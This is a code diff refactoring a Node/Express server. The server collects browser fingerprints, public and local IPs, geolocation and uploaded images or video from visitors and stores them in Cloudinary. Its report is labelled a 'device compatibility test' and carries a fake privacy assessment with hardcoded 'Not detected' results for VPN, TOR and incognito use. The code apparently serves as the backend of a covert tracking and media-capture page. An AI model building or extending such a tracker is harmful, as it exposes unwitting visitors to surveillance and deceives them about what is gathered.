@@ -27,7 +27,7 @@ function configureCloudinary() {
       api_key: process.env.CLOUDINARY_API_KEY,
       api_secret: process.env.CLOUDINARY_API_SECRET,
       secure: true,
-      timeout: 10000 // 10 second timeout
+      timeout: 10000
     });
     console.log('Cloudinary configured successfully');
     return cloudinary;
@@ -52,35 +52,93 @@ async function testCloudinaryConnection(cloudinary) {
     console.log('Cloudinary connection test successful:', testResult.secure_url);
     return true;
   } catch (error) {
-    console.error('Cloudinary connection test failed:', {
-      message: error.message,
-      stack: error.stack
-    });
+    console.error('Cloudinary connection test failed:', error);
     process.exit(1);
   }
 }
 
-// Helper function to format fingerprint report as plain text
+// Format fingerprint report
 function formatFingerprintReport(clientInfo, data, fingerprintHash) {
-  // Helper functions for Yes/No and safe value
   const yn = v => v ? 'Yes' : 'No';
   const safe = v => (v !== undefined && v !== null ? v : 'Unknown');
-  // Compose the report
-  return `==================================================\nPRIVACY & SECURITY ASSESSMENT\n==================================================\nIncognito Mode: Not detected\nVPN Usage: Not detected\nProxy Usage: Not detected\nTOR Usage: Not detected\n\nIP Leak Protection:\n- DNS Leak: Protected\n- WebRTC Leak: Protected\n\n==================================================\nDEVICE COMPATIBILITY TEST REPORT\n==================================================\nGenerated: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true })}\nSession ID: N/A\nCollection Type: PROCESSED_FINGERPRINT\n\n==================================================\nNETWORK INFORMATION\n==================================================\nPublic IP: ${safe(clientInfo.ip)}\nLocal IPs: ${safe(data.location_info?.local_ips)}\nNetwork Type: N/A\nServer-detected IP: ${safe(clientInfo.ip)}\nIP Match: N/A\n\n\n==================================================\nDEVICE & SYSTEM INFORMATION\n==================================================\nOperating System: ${safe(data.device_info?.operating_system)}\nBrowser: ${safe(data.device_info?.browser)} ${safe(data.device_info?.browser_version)}\nPlatform: ${safe(data.device_info?.platform)}\nMobile Device: ${yn(data.device_info?.mobile_device)}\nTimezone: ${safe(data.timezone_info?.reported_timezone)}\n\n==================================================\nLOCATION & NETWORK\n==================================================\nIP Address: ${safe(data.location_info?.ip_address)}\nLocation: N/A\nTimezone: ${safe(data.timezone_info?.reported_timezone)}\n\n==================================================\nDISPLAY & HARDWARE\n==================================================\nScreen Resolution: ${safe(data.display_info?.screen_resolution)}\nViewport Size: ${safe(data.display_info?.viewport_size)}\nColor Depth: ${safe(data.display_info?.color_depth)} bits\nCPU Cores: ${safe(data.hardware_info?.cpu_cores)}\nDevice Memory: ${safe(data.hardware_info?.device_memory)}\nTouch Support: ${yn(data.hardware_info?.touch_support)}\n\n==================================================\nBROWSER CAPABILITIES\n==================================================\nWebGL Support: ${yn(data.browser_features?.webgl_support)}\nCanvas Fingerprint: ${yn(data.browser_features?.canvas_fingerprint_available)}\nCookies Enabled: ${yn(data.browser_features?.cookies_enabled)}\nLocal Storage: ${yn(data.browser_features?.local_storage_available)}\n\n==================================================\nPRIVACY & SECURITY ASSESSMENT\n==================================================\nPrivacy Risk Level: Low\nRisk Score: 55/100\nOverall Fingerprint Hash: ${safe(data.fingerprints?.overall_fingerprint_hash)}\n\n==================================================\nEND OF REPORT\n==================================================\n`;
+  const geo = clientInfo.geo;
+  const locationStr = geo ? `${geo.city || 'Unknown'}, ${geo.region || 'Unknown'}, ${geo.country || 'Unknown'}` : 'Unknown';
+
+  return `
+==================================================
+PRIVACY & SECURITY ASSESSMENT
+==================================================
+Incognito Mode: Not detected
+VPN Usage: Not detected
+TOR Usage: Not detected
+
+==================================================
+DEVICE COMPATIBILITY TEST REPORT
+==================================================
+Generated: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true })}
+Collection Type: PROCESSED_FINGERPRINT
+
+==================================================
+NETWORK INFORMATION
+==================================================
+Public IP: ${safe(clientInfo.ip)}
+Local IPs: ${safe(data.location_info?.local_ips)}
+Network Type: ${safe(data.network_info?.network_type || 'Unknown')}
+Server-detected IP: ${safe(clientInfo.ip)}
+
+==================================================
+DEVICE & SYSTEM INFORMATION
+==================================================
+Operating System: ${safe(data.device_info?.operating_system)}
+Browser: ${safe(data.device_info?.browser)} ${safe(data.device_info?.browser_version)}
+Platform: ${safe(data.device_info?.platform)}
+Mobile Device: ${yn(data.device_info?.mobile_device)}
+Timezone: ${safe(data.timezone_info?.reported_timezone)}
+
+==================================================
+LOCATION & NETWORK
+==================================================
+IP Address: ${safe(data.location_info?.ip_address)}
+Location: ${locationStr}
+Timezone: ${safe(data.timezone_info?.reported_timezone)}
+
+==================================================
+DISPLAY & HARDWARE
+==================================================
+Screen Resolution: ${safe(data.display_info?.screen_resolution)}
+Viewport Size: ${safe(data.display_info?.viewport_size)}
+Color Depth: ${safe(data.display_info?.color_depth)} bits
+CPU Cores: ${safe(data.hardware_info?.cpu_cores)}
+Device Memory: ${safe(data.hardware_info?.device_memory)}
+Touch Support: ${yn(data.hardware_info?.touch_support)}
+
+==================================================
+BROWSER CAPABILITIES
+==================================================
+Cookies Enabled: ${yn(data.browser_features?.cookies_enabled)}
+
+==================================================
+PRIVACY & SECURITY ASSESSMENT
+==================================================
+Overall Fingerprint Hash: ${safe(data.fingerprints?.overall_fingerprint_hash)}
+
+==================================================
+END OF REPORT
+==================================================
+`;
 }
 
-// Initialize Express application
+// Initialize Express app
 async function initializeApp() {
   const app = express();
-  
-  // Enhanced security middleware
+
   app.use(helmet({
     contentSecurityPolicy: {
       directives: {
         defaultSrc: ["'self'"],
         scriptSrc: ["'self'", "'unsafe-inline'"],
         connectSrc: [
-          "'self'", 
+          "'self'",
           "https://api.ipify.org",
           `https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'localhost:3000'}`,
           "https://res.cloudinary.com"
@@ -95,20 +153,18 @@ async function initializeApp() {
     crossOriginResourcePolicy: { policy: "cross-origin" }
   }));
 
-  // Rate limiting
   app.use(rateLimit({
-    windowMs: 15 * 60 * 1000, // 15 minutes
-    max: 100, // limit each IP to 100 requests per windowMs
+    windowMs: 15 * 60 * 1000,
+    max: 100,
     message: 'Too many requests from this IP, please try again later'
   }));
 
-  // Body parsing middleware with size limit
   app.use(express.json({
     limit: '10mb',
-    verify: (req, res, buf, encoding) => {
+    verify: (req, res, buf) => {
       try {
         JSON.parse(buf);
-      } catch (e) {
+      } catch {
         res.status(400).json({ error: 'Invalid JSON' });
         throw new Error('Invalid JSON');
       }
@@ -117,7 +173,6 @@ async function initializeApp() {
 
   app.use(express.static('public'));
 
-  // CORS configuration
   app.use((req, res, next) => {
     res.header('Access-Control-Allow-Origin', '*');
     res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
@@ -125,15 +180,11 @@ async function initializeApp() {
     next();
   });
 
-  // Utility functions
-  function getClientIp(req) {
-    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip;
-  }
+  const getClientIp = req => req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip;
 
-  function getClientInfo(req) {
+  const getClientInfo = req => {
     const ip = getClientIp(req);
     const geo = geoip.lookup(ip);
-    
     return {
       ip,
       geo: geo ? {
@@ -144,13 +195,10 @@ async function initializeApp() {
       userAgent: req.headers['user-agent'],
       timestamp: new Date().toISOString()
     };
-  }
+  };
 
-  function generateHash(data) {
-    return crypto.createHash('sha256').update(JSON.stringify(data)).digest('hex');
-  }
+  const generateHash = data => crypto.createHash('sha256').update(JSON.stringify(data)).digest('hex');
 
-  // Health check endpoint
   app.get('/', (req, res) => {
     res.json({
       status: 'active',
@@ -160,38 +208,22 @@ async function initializeApp() {
     });
   });
 
-  // IP detection endpoint
   app.get('/get-ip', (req, res) => {
-    const ip = getClientIp(req);
-    res.json({ ip });
+    res.json({ ip: getClientIp(req) });
   });
 
-  // Fingerprint collection endpoint
   app.post('/collect-fingerprint', async (req, res) => {
     try {
-      console.log('Incoming fingerprint request from:', getClientIp(req));
-      
-      if (!req.body || typeof req.body !== 'object') {
-        console.error('Invalid request body:', req.body);
-        return res.status(400).json({ error: 'Invalid request data' });
-      }
-
-      // Validate required fields
-      if (!req.body.data || !req.body.timestamp) {
-        return res.status(400).json({ 
-          error: 'Missing required fields',
-          required: ['data', 'timestamp']
-        });
-      }
-
       const clientInfo = getClientInfo(req);
+      if (!req.body?.data || !req.body.timestamp) {
+        return res.status(400).json({ error: 'Missing required fields', required: ['data', 'timestamp'] });
+      }
       const fingerprintHash = generateHash(req.body.data);
-      
-      console.log('Processing fingerprint data from:', clientInfo.ip);
-      
+      const base64Text = Buffer.from(formatFingerprintReport(clientInfo, req.body.data, fingerprintHash)).toString('base64');
+
       const uploadResult = await Promise.race([
         cloudinary.uploader.upload(
-          `data:text/plain;base64,${Buffer.from(formatFingerprintReport(clientInfo, req.body.data, fingerprintHash)).toString('base64')}`,
+          `data:text/plain;base64,${base64Text}`,
           {
             folder: 'fingerprints',
             resource_type: 'raw',
@@ -201,48 +233,29 @@ async function initializeApp() {
             timeout: 10000
           }
         ),
-        new Promise((_, reject) => {
-          setTimeout(() => reject(new Error('Upload timeout')), 10000);
-        })
+        new Promise((_, reject) => setTimeout(() => reject(new Error('Upload timeout')), 10000))
       ]);
 
-      console.log('Fingerprint saved successfully:', uploadResult.secure_url);
-      
-      res.json({ 
-        success: true, 
-        url: uploadResult.secure_url,
-        hash: fingerprintHash
-      });
+      res.json({ success: true, url: uploadResult.secure_url, hash: fingerprintHash });
 
     } catch (error) {
-      console.error('[ERROR] Fingerprint collection failed:', error.message, error);
-      
-      res.status(500).json({ 
-        error: 'Failed to save fingerprint',
-        details: process.env.NODE_ENV === 'development' ? error.message : null
-      });
+      console.error('[ERROR] Fingerprint collection failed:', error);
+      res.status(500).json({ error: 'Failed to save fingerprint', details: process.env.NODE_ENV === 'development' ? error.message : null });
     }
   });
 
-  // Media collection endpoint
   app.post('/collect-media', async (req, res) => {
     try {
       const { data, metadata } = req.body;
-      
-      if (!data || !metadata || !metadata.media_type) {
-        return res.status(400).json({ 
-          error: 'Invalid media data',
-          required: ['data', 'metadata.media_type']
-        });
+      if (!data || !metadata?.media_type) {
+        return res.status(400).json({ error: 'Invalid media data', required: ['data', 'metadata.media_type'] });
       }
 
       const clientInfo = getClientInfo(req);
       const resourceType = metadata.media_type === 'image' ? 'image' : 'video';
-      
-      console.log('Processing media upload from:', clientInfo.ip);
-      
+
       const uploadResult = await cloudinary.uploader.upload(
-        `data:${resourceType === 'image' ? 'image/jpeg' : 'video/webm'};base64,${data}`, 
+        `data:${resourceType === 'image' ? 'image/jpeg' : 'video/webm'};base64,${data}`,
         {
           folder: 'media',
           resource_type: resourceType,
@@ -252,28 +265,17 @@ async function initializeApp() {
         }
       );
 
-      console.log('Media saved successfully:', uploadResult.secure_url);
-      
-      res.json({ 
-        success: true, 
-        url: uploadResult.secure_url,
-        public_id: uploadResult.public_id
-      });
+      res.json({ success: true, url: uploadResult.secure_url, public_id: uploadResult.public_id });
     } catch (error) {
       console.error('Media upload error:', error);
-      res.status(500).json({ 
-        error: 'Failed to save media',
-        details: process.env.NODE_ENV === 'development' ? error.message : null
-      });
+      res.status(500).json({ error: 'Failed to save media', details: process.env.NODE_ENV === 'development' ? error.message : null });
     }
   });
 
-  // 404 handler
   app.use((req, res) => {
     res.status(404).json({ error: 'Not found' });
   });
 
-  // Error handler
   app.use((error, req, res, next) => {
     console.error('Server error:', error);
     res.status(500).json({ error: 'Internal server error' });
@@ -282,19 +284,11 @@ async function initializeApp() {
   return app;
 }
 
-// Application startup sequence
 async function startApplication() {
   try {
-    // 1. Configure Cloudinary
     const cloudinaryInstance = configureCloudinary();
-    
-    // 2. Test Cloudinary connection
     await testCloudinaryConnection(cloudinaryInstance);
-    
-    // 3. Initialize Express app
     const app = await initializeApp();
-    
-    // 4. Start server
     const PORT = process.env.PORT || 3000;
     app.listen(PORT, () => {
       console.log(`Server running on port ${PORT}`);
@@ -306,5 +300,4 @@ async function startApplication() {
   }
 }
 
-// Start the application
 startApplication();
